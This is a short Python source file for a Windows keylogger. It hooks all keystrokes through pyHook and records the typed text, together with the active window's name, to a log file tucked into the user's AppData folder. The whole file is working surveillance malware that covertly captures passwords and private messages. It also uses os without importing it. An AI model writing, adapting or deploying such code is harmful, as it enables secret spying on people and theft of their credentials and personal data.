import pythoncom, pyHook

BUFF = ""
LOG_FILE_NAME = os.path.expanduser('~')+"\\AppData\\Local\\log.txt" #Change file name and path as you wish

def translate(event):
	"""
		Converts Windows virtual key codes to ascii characters.
		If key code is an alphabet, use it's ascii value, otherwise, use key
		name.
	"""
	if(event.Ascii >= 0 and event.Ascii <= 31) or (event.Ascii == 127):
		return event.Key
	else:
		return chr(event.Ascii)

def intercept(event):
	"""
		Intercepts key stroke events, and writes them to a file only if pressed
		key is ENTER or H-TAB.
	"""
	global BUFF

	BUFF += translate(event)
	
	if(event.Ascii == 13 or event.Ascii == 9):
		window_name = event.WindowName
		chunk = {
	        'client_id': 1,
	        'window_nm': window_name,
	        'captured' : BUFF
   		}

		logfile = open(LOG_FILE_NAME, "a")
		logfile.write(str(chunk)+'\n')
		logfile.close()
		BUFF = ""

	return True

def main():
    obj = pyHook.HookManager()
    obj.KeyDown = intercept
    obj.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()